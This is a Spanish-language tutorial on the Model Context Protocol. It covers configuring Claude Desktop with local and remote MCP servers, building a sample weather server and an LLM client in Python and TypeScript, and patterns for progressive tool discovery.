La negociación de versiones ocurre durante la inicialización. Clientes y servidores **PUEDEN** soportar múltiples versiones del protocolo simultáneamente, pero **DEBEN** acordar una única versión para usar durante la sesión.

El protocolo provee manejo de errores apropiado si la negociación de versiones falla, permitiendo que los clientes terminen las conexiones de forma elegante cuando no pueden encontrar una versión compatible con el servidor.

---

## Desarrollar con MCP

---

## Conectarse a servidores MCP locales

Los servidores MCP locales extienden las capacidades de las aplicaciones de IA proveyendo acceso seguro y controlado a recursos y herramientas locales. Esta guía usa Claude Desktop como ejemplo —uno de los muchos clientes que soportan MCP—, pero los conceptos aplican a cualquier cliente compatible.

Al finalizar esta configuración, Claude puede interactuar con archivos de tu computadora, crear documentos, organizar carpetas y buscar en el sistema de archivos, siempre con tu aprobación explícita para cada acción.

---

### Prerrequisitos

| Requisito | Detalle |
|---|---|
| **Claude Desktop** | Descargarlo e instalarlo para macOS o Windows; verificar que esté actualizado |
| **Node.js** | Requerido por el Filesystem Server y la mayoría de los servidores MCP |

Para verificar Node.js:

```bash
node --version
```

Si no está instalado, descargarlo de nodejs.org. Se recomienda la versión LTS.

---

### Entendiendo los servidores MCP locales

Los servidores MCP son programas que corren en tu computadora y proveen capacidades específicas a Claude Desktop a través del protocolo estandarizado. Cada servidor expone tools que Claude puede usar para realizar acciones, con tu aprobación.

El **Filesystem Server** que instalaremos provee tools para:

- Leer contenidos de archivos y estructuras de directorios
- Crear nuevos archivos y directorios
- Mover y renombrar archivos
- Buscar archivos por nombre o contenido

Todas las acciones requieren tu aprobación explícita antes de ejecutarse.

---

### Instalación del Filesystem Server

La configuración le indica a Claude Desktop qué servidores iniciar automáticamente al lanzarse. Se realiza a través de un archivo JSON.

#### Paso 1 — Abrir la configuración de Claude Desktop

Hacé clic en el menú Claude de la barra de menús del sistema (no la configuración dentro de la ventana de Claude) y seleccioná "Settings...".

#### Paso 2 — Acceder a la configuración de desarrollador

En la ventana de Settings, navegá a la pestaña "Developer" en la barra lateral izquierda y hacé clic en "Edit Config" para abrir el archivo de configuración.

Ubicación del archivo:

| Sistema operativo | Ruta |
|---|---|
| **macOS** | `~/Library/Application Support/Claude/claude_desktop_config.json` |
| **Windows** | `%APPDATA%\Claude\claude_desktop_config.json` |

#### Paso 3 — Configurar el Filesystem Server

Reemplazá el contenido del archivo con la siguiente estructura JSON. Sustituí `username` con tu nombre de usuario real:

```json
// macOS
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/username/Desktop",
        "/Users/username/Downloads"
      ]
    }
  }
}
```

```json
// Windows
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "C:\\Users\\username\\Desktop",
        "C:\\Users\\username\\Downloads"
      ]
    }
  }
}
```

Significado de cada campo:

| Campo | Significado |
|---|---|
| `"filesystem"` | Nombre amigable del servidor que aparece en Claude Desktop |
| `"command": "npx"` | Usa la herramienta npx de Node.js para correr el servidor |
| `"-y"` | Confirma automáticamente la instalación del paquete |
| `"@modelcontextprotocol/server-filesystem"` | Nombre del paquete del Filesystem Server |
| Argumentos restantes | Directorios a los que el servidor puede acceder |

> **Consideración de seguridad:** Solo otorgá acceso a directorios con los que te sentís cómodo. El servidor corre con los permisos de tu cuenta de usuario.

#### Paso 4 — Reiniciar Claude Desktop

Cerrá completamente Claude Desktop y volvé a abrirlo. Al reiniciar exitosamente, aparecerá un indicador de servidor MCP en la esquina inferior derecha del campo de entrada de conversación. Hacé clic en él para ver las tools disponibles provistas por el Filesystem Server.

---

### Usando el Filesystem Server

Con el Filesystem Server conectado, Claude puede interactuar con tu sistema de archivos. Ejemplos de pedidos:

- *"¿Podés escribir un poema y guardarlo en mi escritorio?"* — Claude compondrá un poema y creará un archivo de texto en el escritorio
- *"¿Qué archivos relacionados con el trabajo hay en mi carpeta de descargas?"* — Claude escaneará las descargas e identificará documentos de trabajo
- *"Por favor organizá todas las imágenes de mi escritorio en una nueva carpeta llamada 'Imágenes'"* — Claude creará la carpeta y moverá los archivos

Antes de ejecutar cualquier operación, Claude solicitará tu aprobación. Podés denegar cualquier pedido si no te sentís cómodo con la acción propuesta.

---

### Solución de problemas

| Problema | Solución |
|---|---|
| El servidor no aparece / falta el ícono | Reiniciar Claude Desktop; verificar la sintaxis del JSON; asegurarse de que las rutas sean absolutas y válidas |
| Ver los logs de Claude Desktop | macOS: `~/Library/Logs/Claude`; Windows: `%APPDATA%\Claude\logs`. El archivo `mcp.log` contiene logs generales; `mcp-server-SERVERNAME.log` contiene errores del servidor específico |
| Las tool calls fallan silenciosamente | Revisar los logs, verificar que el servidor corra sin errores, reiniciar Claude Desktop |
| Error `ENOENT` o `${APPDATA}` en rutas (Windows) | Agregar el valor expandido de `%APPDATA%` al campo `env` en la configuración |

Para seguir los logs en tiempo real:

```bash
# macOS/Linux
tail -n 20 -f ~/Library/Logs/Claude/mcp*.log

# Windows
type "%APPDATA%\Claude\logs\mcp*.log"
```

Si el problema persiste, correr el servidor manualmente para ver errores:

```bash
# macOS/Linux
npx -y @modelcontextprotocol/server-filesystem /Users/username/Desktop /Users/username/Downloads

# Windows
npx -y @modelcontextprotocol/server-filesystem C:\Users\username\Desktop C:\Users\username\Downloads
```

---

## Conectarse a servidores MCP remotos

Los servidores MCP remotos extienden las capacidades de las aplicaciones de IA más allá del entorno local, proveyendo acceso a herramientas, servicios y fuentes de datos alojados en internet. Al conectarse a ellos, los asistentes de IA pasan de ser herramientas útiles a compañeros de equipo informados capaces de manejar proyectos complejos y de múltiples pasos con acceso en tiempo real a recursos externos.

### Servidores locales vs. remotos

| Característica | Servidor local | Servidor remoto |
|---|---|---|
| Dónde corre | En tu máquina | En internet |
| Instalación | Requerida en cada dispositivo | No requerida en el cliente |
| Acceso | Solo desde esa máquina | Desde cualquier cliente MCP con conexión |
| Ideal para | Acceso al filesystem, herramientas locales | Integraciones web, servicios de terceros, autenticación server-side |

---

### ¿Qué son los Custom Connectors?

Los **Custom Connectors** son el puente entre Claude y los servidores MCP remotos. Permiten conectar Claude directamente a las herramientas y fuentes de datos más relevantes para tus flujos de trabajo, habilitando a Claude para operar dentro de tu software favorito y extraer insights del contexto completo de tus herramientas externas.

Con Custom Connectors podés:

- Conectar Claude a servidores MCP remotos existentes provistos por desarrolladores de terceros
- Construir tus propios servidores MCP remotos para conectarte con cualquier herramienta

---

### Conectarse a un servidor MCP remoto

#### Paso 1 — Navegar a la configuración de conectores

Abrí Claude en el navegador, hacé clic en tu ícono de perfil y seleccioná "Settings". Luego localizá la sección "Connectors" en la barra lateral. Ahí verás los conectores configurados actualmente y la opción para agregar nuevos.

#### Paso 2 — Agregar un Custom Connector

En la sección Connectors, hacé clic en "Add custom connector" al final de la lista. Aparecerá un diálogo donde ingresarás la URL del servidor MCP remoto (provista por el desarrollador o administrador del servidor). Asegurate de incluir el protocolo completo (`https://`) y cualquier componente de ruta necesario. Hacé clic en "Add" para continuar.

#### Paso 3 — Completar la autenticación

La mayoría de los servidores MCP remotos requieren autenticación para garantizar acceso seguro a sus recursos. El proceso varía según la implementación del servidor:

| Método | Descripción |
|---|---|
| **OAuth** | Te redirige a un proveedor de autenticación de terceros |
| **API key** | Ingresás una clave provista por el servicio |
| **Usuario/contraseña** | Formulario de login dentro de Claude |

Seguí los prompts de autenticación. Una vez completada, Claude establecerá una conexión segura al servidor remoto.

#### Paso 4 — Acceder a resources y prompts

Tras la conexión exitosa, las resources y prompts del servidor remoto estarán disponibles en tus conversaciones de Claude. Accedé a ellos haciendo clic en el ícono de clip en el área de entrada de mensajes. El menú mostrará todos los recursos y prompts disponibles de tus servidores conectados; seleccioná los que querés incluir en la conversación.

#### Paso 5 — Configurar permisos de tools

Los servidores MCP remotos frecuentemente exponen múltiples tools con distintas capacidades. Podés controlar cuáles puede usar Claude configurando permisos en la configuración del conector. Esto garantiza que Claude solo realice acciones que vos hayas autorizado explícitamente. Desde los settings del conector podés habilitar o deshabilitar tools específicas, establecer límites de uso y configurar otros parámetros de seguridad.

---

### Buenas prácticas para servidores MCP remotos

**Seguridad:**
- Verificá siempre la autenticidad del servidor MCP remoto antes de conectarte
- Solo conectate a servidores de fuentes confiables
- Revisá los permisos solicitados durante la autenticación
- Sé cauteloso al otorgar acceso a datos sensibles o sistemas críticos

**Gestión de múltiples conectores:**
- Podés conectarte a múltiples servidores MCP remotos simultáneamente
- Organizá tus conectores por propósito o proyecto para mayor claridad
- Revisá y eliminá regularmente los conectores que ya no usés para mantener tu workspace ordenado y seguro

---

## Construir con Agent Skills

Los **Agent Skills** son conjuntos de instrucciones portables que le dan a los asistentes de codificación IA conocimiento de dominio para una tarea específica. Para el desarrollo MCP, codifican las decisiones de diseño —modelo de deployment, patrones de tools, autenticación— para que el agente pueda interrogar tu caso de uso y generar un servidor que se ajuste a él.

---

### Skills disponibles

Un conjunto de referencia de skills para desarrollo MCP está disponible como el plugin `mcp-server-dev`. Provee tres skills que se componen entre sí:

| Skill | Propósito |
|---|---|
| `build-mcp-server` | Punto de entrada. Interroga el caso de uso, elige un modelo de deployment y patrón de tool-design, y enruta a las skills especializadas |
| `build-mcp-app` | Agrega widgets de UI interactivos (formularios, selectores, dashboards) renderizados inline en el chat |
| `build-mcpb` | Empaqueta un servidor stdio local con su runtime para que los usuarios puedan instalarlo sin Node o Python |

Cada skill incluye un archivo `SKILL.md` más una carpeta `references/` con material de soporte (flujos de auth, patrones de tool-design, templates de widgets, schemas de manifesto) que el agente lee bajo demanda.

Para instalarlos en Claude Code:

```bash
/plugin marketplace add anthropics/claude-plugins-official
/plugin install mcp-server-dev
```

Para otros agentes, revisá tu catálogo de skills o extensiones, o cloná los directorios de skills (`SKILL.md` más `references/`) en la ubicación de skills de tu agente.

---

### Iniciar una construcción

Con las skills instaladas, pedile a tu agente que te ayude a construir un servidor MCP. La skill de entrada se activa con pedidos en lenguaje natural, o podés invocarla directamente.

La skill ejecuta una fase de descubrimiento antes de escribir código. Espera preguntas sobre:

| Pregunta | Por qué importa |
|---|---|
| **A qué se conecta** — una API en la nube, proceso local, filesystem, hardware | Define el modelo de deployment adecuado |
| **Quiénes lo usarán** — solo vos, tu equipo, o cualquiera que lo instale | Determina si el servidor debe ser local o remoto |
| **Tamaño de la superficie de acción** — pocas operaciones vs. envolver una API grande | Influye en el patrón de diseño de tools |
| **Necesidades de interacción con el usuario** — resultados en texto plano, input estructurado vía elicitation, o widgets de UI ricos | Define si se necesita `build-mcp-app` |
| **Autenticación upstream** — API keys, OAuth 2.0, o ninguna | Afecta la arquitectura de seguridad del servidor |

Si tu mensaje inicial ya cubre estos puntos, el agente saltea la fase de descubrimiento directamente a la recomendación.

---

### Caminos de deployment

Según el descubrimiento, la skill recomienda uno de cuatro caminos:

| Camino | Cuándo usarlo |
|---|---|
| **Streamable HTTP remoto** | Para cualquier cosa que envuelva una API en la nube. Sin fricción de instalación, un solo deployment sirve a todos los usuarios, y los flujos OAuth funcionan correctamente porque el servidor puede manejar redirects y almacenamiento de tokens. Incluye scaffolds para Cloudflare Workers y setups Express/FastMCP portables. |
| **MCP Apps** | Cuando se necesitan widgets interactivos renderizados en el chat (selectores con búsqueda, gráficos, dashboards en vivo) y las restricciones de formulario plano de elicitation no son suficientes. La skill delega a `build-mcp-app`. |
| **MCP Bundles (MCPB)** | Cuando el servidor debe tocar la máquina del usuario: leer archivos locales, manejar apps de escritorio o hablar con servicios en localhost. Empaqueta el servidor con su runtime como un único archivo `.mcpb`, sin que el usuario necesite instalar Node o Python. La skill delega a `build-mcpb`. |
| **stdio local** | Disponible para prototipado, con un camino de actualización a MCPB cuando estés listo para distribuir. |

---

### Próximos pasos

Una vez que tu agente genera el scaffold del servidor, iterá sobre las descripciones de tools y el manejo de errores, luego testeá y publicá:

- **MCP Inspector** — Testea las tools, resources y prompts de tu servidor de forma interactiva
- **Conectar a un cliente** — Conectá tu servidor a un cliente MCP vía configuración local o remota
- **Publicar en el Registry** — Hacé que tu servidor sea descubrible en el MCP Registry

---

## Construir un servidor MCP

En este tutorial construimos un servidor MCP simple de clima con dos tools: `get_alerts` y `get_forecast`, y lo conectamos a Claude for Desktop.

Los SDKs oficiales disponibles son: **Python**, **TypeScript**, **Java** (Spring AI), **Kotlin** y **C#**.

---

### Conceptos MCP que usa este servidor

| Primitivo | Uso en este tutorial |
|---|---|
| **Tools** | `get_alerts` y `get_forecast` — el LLM las invoca con aprobación del usuario |
| **Resources** | No usadas en este ejemplo básico |
| **Prompts** | No usados en este ejemplo básico |

---

### Consideración crítica: logging en servidores STDIO

> En servidores basados en STDIO, **nunca escribas a stdout**. El protocolo JSON-RPC viaja por stdout y cualquier escritura adicional corrompe los mensajes y rompe el servidor.

| Lenguaje | ❌ Evitar | ✅ Usar |
|---|---|---|
| Python | `print("msg")` | `print("msg", file=sys.stderr)` o `logging.info(...)` |
| TypeScript | `console.log(...)` | `console.error(...)` |
| Java | `System.out.println(...)` | Logger a stderr o archivo |
| Kotlin | `println(...)` | Logger a stderr o archivo |
| C# | `Console.WriteLine(...)` | Logger a stderr o archivo |

En servidores HTTP esto no aplica — el logging estándar funciona correctamente.

---

### Configuración del entorno (Python)

```bash
# macOS/Linux
curl -LsSf https://astral.sh/uv/install.sh | sh

# Windows
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
```

```bash
# Crear y configurar el proyecto
uv init weather
cd weather
uv venv
source .venv/bin/activate        # macOS/Linux
# .venv\Scripts\activate         # Windows

uv add "mcp[cli]" httpx
touch weather.py
```

---

### Construir el servidor (Python)

#### 1. Imports e inicialización

```python
from typing import Any
import httpx
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("weather")  # FastMCP usa type hints y docstrings para generar las definiciones de tools automáticamente

NWS_API_BASE = "https://api.weather.gov"
USER_AGENT = "weather-app/1.0"
```

#### 2. Funciones auxiliares

```python
async def make_nws_request(url: str) -> dict[str, Any] | None:
    """Hace un request a la API de NWS con manejo de errores."""
    headers = {"User-Agent": USER_AGENT, "Accept": "application/geo+json"}
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, headers=headers, timeout=30.0)
            response.raise_for_status()
            return response.json()
        except Exception:
            return None

def format_alert(feature: dict) -> str:
    """Formatea un feature de alerta en texto legible."""
    props = feature["properties"]
    return f"""
Event: {props.get("event", "Unknown")}
Area: {props.get("areaDesc", "Unknown")}
Severity: {props.get("severity", "Unknown")}
Description: {props.get("description", "No description available")}
Instructions: {props.get("instruction", "No specific instructions provided")}
"""
```

#### 3. Definición de tools

```python
@mcp.tool()
async def get_alerts(state: str) -> str:
    """Obtiene alertas meteorológicas para un estado de EE.UU.

    Args:
        state: Código de dos letras del estado (ej. CA, NY)
    """
    url = f"{NWS_API_BASE}/alerts/active/area/{state}"
    data = await make_nws_request(url)

    if not data or "features" not in data:
        return "Unable to fetch alerts or no alerts found."
    if not data["features"]:
        return "No active alerts for this state."

    alerts = [format_alert(feature) for feature in data["features"]]
    return "\n---\n".join(alerts)


@mcp.tool()
async def get_forecast(latitude: float, longitude: float) -> str:
    """Obtiene el pronóstico meteorológico para una ubicación.

    Args:
        latitude: Latitud de la ubicación
        longitude: Longitud de la ubicación
    """
    points_url = f"{NWS_API_BASE}/points/{latitude},{longitude}"
    points_data = await make_nws_request(points_url)

    if not points_data:
        return "Unable to fetch forecast data for this location."

    forecast_url = points_data["properties"]["forecast"]
    forecast_data = await make_nws_request(forecast_url)

    if not forecast_data:
        return "Unable to fetch detailed forecast."

    periods = forecast_data["properties"]["periods"]
    forecasts = []
    for period in periods[:5]:  # Solo los próximos 5 períodos
        forecast = f"""
{period["name"]}:
Temperature: {period["temperature"]}°{period["temperatureUnit"]}
Wind: {period["windSpeed"]} {period["windDirection"]}
Forecast: {period["detailedForecast"]}
"""
        forecasts.append(forecast)

    return "\n---\n".join(forecasts)
```

#### 4. Iniciar el servidor

```python
def main():
    mcp.run(transport="stdio")

if __name__ == "__main__":
    main()
```

Correr con: `uv run weather.py`

---

### Configuración del entorno (TypeScript)

```bash
mkdir weather && cd weather
npm init -y
npm install @modelcontextprotocol/sdk zod@3
npm install -D @types/node typescript
mkdir src && touch src/index.ts
```

`package.json` — agregar:
```json
{
  "type": "module",
  "bin": { "weather": "./build/index.js" },
  "scripts": { "build": "tsc && chmod 755 build/index.js" },
  "files": ["build"]
}
```

`tsconfig.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "Node16",
    "moduleResolution": "Node16",
    "outDir": "./build",
    "rootDir": "./src",
    "strict": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules"]
}
```

---

### Construir el servidor (TypeScript)

```typescript
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";

const NWS_API_BASE = "https://api.weather.gov";
const USER_AGENT = "weather-app/1.0";

const server = new McpServer({ name: "weather", version: "1.0.0" });

// Registrar tools con Zod para validación de schema
server.registerTool(
  "get_alerts",
  {
    description: "Get weather alerts for a state",
    inputSchema: {
      state: z.string().length(2).describe("Two-letter state code (e.g. CA, NY)"),
    },
  },
  async ({ state }) => {
    const alertsUrl = `${NWS_API_BASE}/alerts?area=${state.toUpperCase()}`;
    // ... lógica de fetch y formateo
    return { content: [{ type: "text", text: alertsText }] };
  },
);

server.registerTool(
  "get_forecast",
  {
    description: "Get weather forecast for a location",
    inputSchema: {
      latitude:  z.number().min(-90).max(90).describe("Latitude"),
      longitude: z.number().min(-180).max(180).describe("Longitude"),
    },
  },
  async ({ latitude, longitude }) => {
    // ... lógica de fetch y formateo
    return { content: [{ type: "text", text: forecastText }] };
  },
);

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Weather MCP Server running on stdio");
}

main().catch((error) => {
  console.error("Fatal error:", error);
  process.exit(1);
});
```

Compilar con: `npm run build`

---

### Conectar el servidor a Claude for Desktop

Editá el archivo de configuración:

- **macOS/Linux**: `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`

```json
// Python
{
  "mcpServers": {
    "weather": {
      "command": "uv",
      "args": ["--directory", "/RUTA/ABSOLUTA/weather", "run", "weather.py"]
    }
  }
}
```

```json
// TypeScript
{
  "mcpServers": {
    "weather": {
      "command": "node",
      "args": ["/RUTA/ABSOLUTA/weather/build/index.js"]
    }
  }
}
```

> Siempre usá rutas absolutas. En Windows, usá doble barra invertida (`\\`) o barras normales (`/`) en el JSON.

Guardá el archivo y reiniciá Claude for Desktop. El ícono de servidor MCP aparecerá en la esquina inferior derecha de la ventana de conversación.

---

## Construir un cliente MCP

Un cliente MCP es un chatbot impulsado por LLM que se conecta a servidores MCP para usar sus tools. En este tutorial construimos uno que se conecta al servidor de clima del tutorial anterior.

---

### Cómo funciona el cliente

```mermaid
sequenceDiagram
    actor Usuario
    participant Cliente
    participant Claude
    participant ServidorMCP as Servidor MCP
    participant Tools

    Usuario->>Cliente: Envía query
    Cliente<<->>ServidorMCP: Obtiene tools disponibles
    Cliente->>Claude: Envía query + descripciones de tools
    Claude-->>Cliente: Decide qué tools usar
    Cliente->>ServidorMCP: Solicita ejecución de tool
    ServidorMCP->>Tools: Ejecuta la tool
    Tools-->>ServidorMCP: Devuelve resultado
    ServidorMCP-->>Cliente: Envía resultado
    Cliente->>Claude: Envía resultado de la tool
    Claude-->>Cliente: Provee respuesta final
    Cliente-->>Usuario: Muestra respuesta
```

---

### Configuración del entorno (Python)

```bash
uv init mcp-client && cd mcp-client
uv venv && source .venv/bin/activate   # macOS/Linux
# .venv\Scripts\activate               # Windows
uv add mcp anthropic python-dotenv
touch client.py
```

Crear `.env`:
```
ANTHROPIC_API_KEY=tu-api-key-aqui
```

---

### Estructura del cliente (Python)

#### 1. Clase base e inicialización

```python
import asyncio, sys
from typing import Optional
from contextlib import AsyncExitStack

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from anthropic import Anthropic
from dotenv import load_dotenv

load_dotenv()

class MCPClient:
    def __init__(self):
        self.session: Optional[ClientSession] = None
        self.exit_stack = AsyncExitStack()   # gestiona recursos async correctamente
        self.anthropic = Anthropic()
```

#### 2. Conexión al servidor

```python
async def connect_to_server(self, server_script_path: str):
    is_python = server_script_path.endswith('.py')
    is_js = server_script_path.endswith('.js')
    if not (is_python or is_js):
        raise ValueError("Server script must be a .py or .js file")

    command = "python" if is_python else "node"
    server_params = StdioServerParameters(command=command, args=[server_script_path], env=None)

    stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))
    self.stdio, self.write = stdio_transport
    self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))

    await self.session.initialize()

    response = await self.session.list_tools()
    print("Tools disponibles:", [tool.name for tool in response.tools])
```

#### 3. Procesamiento de queries con tool calls

```python
async def process_query(self, query: str) -> str:
    messages = [{"role": "user", "content": query}]

    # 1. Obtener tools disponibles del servidor
    response = await self.session.list_tools()
    available_tools = [{
        "name": tool.name,
        "description": tool.description,
        "input_schema": tool.inputSchema
    } for tool in response.tools]

    # 2. Llamada inicial a Claude con las tools disponibles
    response = self.anthropic.messages.create(
        model="claude-sonnet-4-20250514",
        max_tokens=1000,
        messages=messages,
        tools=available_tools
    )

    final_text = []
    assistant_message_content = []

    for content in response.content:
        if content.type == 'text':
            final_text.append(content.text)
            assistant_message_content.append(content)

        elif content.type == 'tool_use':
            # 3. Claude decidió usar una tool — ejecutarla via el servidor MCP
            tool_name = content.name
            tool_args = content.input
            result = await self.session.call_tool(tool_name, tool_args)
            final_text.append(f"[Usando tool {tool_name} con args {tool_args}]")

            # 4. Enviar el resultado de la tool de vuelta a Claude
            assistant_message_content.append(content)
            messages.append({"role": "assistant", "content": assistant_message_content})
            messages.append({
                "role": "user",
                "content": [{
                    "type": "tool_result",
                    "tool_use_id": content.id,
                    "content": result.content
                }]
            })

            # 5. Claude genera la respuesta final con el resultado de la tool
            response = self.anthropic.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=1000,
                messages=messages,
                tools=available_tools
            )
            final_text.append(response.content[0].text)

    return "\n".join(final_text)
```

#### 4. Chat loop y punto de entrada

```python
async def chat_loop(self):
    print("\nMCP Client iniciado. Escribí 'quit' para salir.")
    while True:
        query = input("\nQuery: ").strip()
        if query.lower() == 'quit':
            break
        response = await self.process_query(query)
        print("\n" + response)

async def cleanup(self):
    await self.exit_stack.aclose()

async def main():
    if len(sys.argv) < 2:
        print("Uso: python client.py <ruta_al_servidor>")
        sys.exit(1)
    client = MCPClient()
    try:
        await client.connect_to_server(sys.argv[1])
        await client.chat_loop()
    finally:
        await client.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
```

Correr:
```bash
uv run client.py ruta/al/servidor/weather.py
```

---

### Versión TypeScript

Instalación:
```bash
mkdir mcp-client-typescript && cd mcp-client-typescript
npm init -y
npm install @anthropic-ai/sdk @modelcontextprotocol/sdk dotenv
npm install -D @types/node typescript
```

Estructura clave:
```typescript
import { Anthropic } from "@anthropic-ai/sdk";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

class MCPClient {
  private mcp: Client;
  private anthropic: Anthropic;
  private transport: StdioClientTransport | null = null;
  private tools: Tool[] = [];

  async connectToServer(serverScriptPath: string) {
    // Detecta Python o Node y crea el transporte stdio
    this.transport = new StdioClientTransport({ command, args: [serverScriptPath] });
    await this.mcp.connect(this.transport);
    const toolsResult = await this.mcp.listTools();
    this.tools = toolsResult.tools.map(tool => ({
      name: tool.name,
      description: tool.description,
      input_schema: tool.inputSchema,
    }));
  }

  async processQuery(query: string) {
    // Mismo flujo que Python: query → Claude → tool call → resultado → Claude → respuesta final
    const result = await this.mcp.callTool({ name: toolName, arguments: toolArgs });
    // ...
  }
}
```

Correr:
```bash
npm run build
node build/index.js ruta/al/servidor/weather.py
```

---

### Componentes clave del cliente — resumen

| Componente | Responsabilidad |
|---|---|
| **Inicialización** | Crea sesión MCP y cliente Anthropic; usa `AsyncExitStack` para gestión de recursos |
| **Conexión al servidor** | Valida el tipo de script, crea el transporte stdio, inicializa la sesión y lista tools |
| **Procesamiento de queries** | Mantiene el historial de conversación, maneja el ciclo tool call → resultado |
| **Chat loop** | Interfaz de línea de comandos con manejo básico de errores |
| **Limpieza** | Cierra conexiones y libera recursos correctamente |

---

### Buenas prácticas

| Área | Recomendación |
|---|---|
| **Manejo de errores** | Envolver tool calls en try-catch; proveer mensajes de error descriptivos |
| **Gestión de recursos** | Usar `AsyncExitStack` (Python) o `finally` (TS) para cleanup garantizado |
| **Seguridad** | Guardar la API key en `.env`; agregar `.env` al `.gitignore` |
| **Nombres de tools** | Validar que el nombre de la tool siga el formato especificado en la spec MCP |

---

### Solución de problemas comunes

| Error | Causa probable | Solución |
|---|---|---|
| `FileNotFoundError` | Ruta al servidor incorrecta | Verificar la ruta; usar ruta absoluta si la relativa falla |
| `Connection refused` | El servidor no está corriendo | Verificar que el path sea correcto y el servidor funcione |
| `Tool execution failed` | Variables de entorno del servidor no configuradas | Revisar el `.env` o las variables requeridas por el servidor |
| `Timeout error` | Respuesta lenta en la primera llamada | Normal — el primer response puede tardar hasta 30 segundos mientras el servidor inicializa |
| `ANTHROPIC_API_KEY is not set` | `.env` no cargado o variable no configurada | Verificar el `.env` y que `load_dotenv()` se llame antes de usar el cliente |

---

## Buenas prácticas para clientes MCP

A medida que las aplicaciones host de MCP se conectan a más servidores y acumulan acceso a cientos o miles de tools, los enfoques ingenuos de gestión de tools dejan de funcionar. Cargar todas las definiciones de tools en la ventana de contexto desde el inicio desperdicia tokens, aumenta la latencia y degrada el rendimiento del modelo. Dos patrones abordan estos desafíos:

| Patrón | Qué controla |
|---|---|
| **Descubrimiento progresivo** | *Cuándo* entran las definiciones de tools al contexto |
| **Invocación programática de tools** | *Cómo* se invocan las tools |

---

### Descubrimiento progresivo de tools

Las implementaciones ingenuas pasan las definiciones de todas las tools de todos los servidores conectados directamente al modelo al inicio de cada conversación. Para un puñado de tools esto es razonable, pero cuando un host tiene acceso a docenas de servidores que exponen cientos de tools, esas definiciones pueden consumir la mayoría de la ventana de contexto antes de que el modelo haya leído el mensaje del usuario.

El descubrimiento progresivo evita esto:

1. El host obtiene las definiciones de tools via `tools/list` como siempre, pero pospone inyectarlas en el contexto del modelo.
2. El host provee una meta-tool ligera `search_tools` al modelo.
3. Las definiciones completas se cargan en el contexto solo cuando son necesarias.

#### Cuándo usar descubrimiento progresivo

| Escenario | Recomendación |
|---|---|
| Pocas tools con definiciones pequeñas | Cargar todas las tools directamente — más simple y sin overhead |
| Definiciones de tools consumen una parte significativa del contexto | Cambiar a descubrimiento progresivo |

Se recomienda implementar un umbral como porcentaje de la ventana de contexto (por ejemplo, 1%-5%). Cuando las definiciones superan ese umbral, activar el descubrimiento progresivo.

#### Estrategias de búsqueda

| Estrategia | Cómo funciona | Cuándo usarla |
|---|---|---|
| **Basada en keywords** | Matching por BM25 o regex | Simple y efectiva para nombres y descripciones descriptivas |
| **Basada en embeddings** | Recuperación por similitud vectorial sobre descripciones | Maneja sinónimos y matching semántico |
| **Basada en subagente** | Un modelo secundario (rápido y pequeño) selecciona las tools | Muy efectivo pero más costoso |
| **Híbrida** | Combina approaches anteriores | Máxima precisión, más complejo de implementar |

> Algunos proveedores como Anthropic y OpenAI ya ofrecen búsqueda de tools nativa. Cuando esté disponible, preferir la implementación del proveedor sobre una custom.

#### Implementación: enfoque de tres capas

**Capa 1 — Catálogo.** El host expone una meta-tool `search_tools` que acepta una query en lenguaje natural y devuelve nombres de tools con descripciones breves:

```typescript
// El modelo invoca la meta-tool de búsqueda
search_tools({ query: "update salesforce record" })

// Devuelve solo nombres y descripciones cortas
→ [
    { name: "salesforce_updateRecord", description: "Update fields on a Salesforce object" },
    { name: "salesforce_upsertRecord", description: "Insert or update based on external ID" }
  ]
```

**Capa 2 — Inspección.** Una vez identificada la tool candidata, el modelo obtiene la definición completa solo para esa tool:

```typescript
get_tool_details({ name: "salesforce_updateRecord" })
// → schema completo con inputSchema, outputSchema, documentación
```

**Capa 3 — Ejecución.** El modelo invoca la tool con pleno conocimiento de su interfaz, habiendo cargado solo las definiciones que necesitaba.

Este patrón reduce dramáticamente el uso de tokens y puede mejorar la precisión en la selección de tools: el modelo se enfoca en pocas tools relevantes en lugar de escanear cientos de irrelevantes.

#### Gestión dinámica de servidores

El descubrimiento progresivo se extiende más allá de tools individuales a servidores completos:

```mermaid
sequenceDiagram
    participant Modelo
    participant Host
    participant Registro
    participant Servidor

    Modelo->>Host: search_available_servers("CRM")
    Host->>Registro: Consulta servidores disponibles
    Registro-->>Host: Servidor Salesforce (no conectado)
    Host-->>Modelo: Servidor Salesforce disponible

    Modelo->>Host: enable_server("salesforce")
    Host->>Servidor: Inicializar conexión
    Servidor-->>Host: Capacidades + tools del servidor
    Host-->>Modelo: Servidor Salesforce conectado

    Note over Modelo: Tarea completada

    Modelo->>Host: disable_server("salesforce")
    Host->>Servidor: Cerrar conexión
    Host-->>Modelo: Servidor desconectado, contexto liberado
```

#### Guías de implementación

| Guía | Justificación |
|---|---|
| **Ofrecer múltiples niveles de detalle** | Permitir al modelo elegir entre solo nombre, nombre+descripción, o schema completo |
| **Cachear definiciones de tools** | Una vez obtenidas del servidor, memorizarlas del lado del host para no necesitar otro round-trip a `tools/list` |
| **Actualizar ante `list_changed`** | Re-indexar el catálogo de búsqueda cuando el servidor envíe `notifications/tools/list_changed` |
| **Agrupar tools por servidor** | Presentar tools organizadas por su servidor de origen para que el modelo pueda razonar sobre capacidades relacionadas |

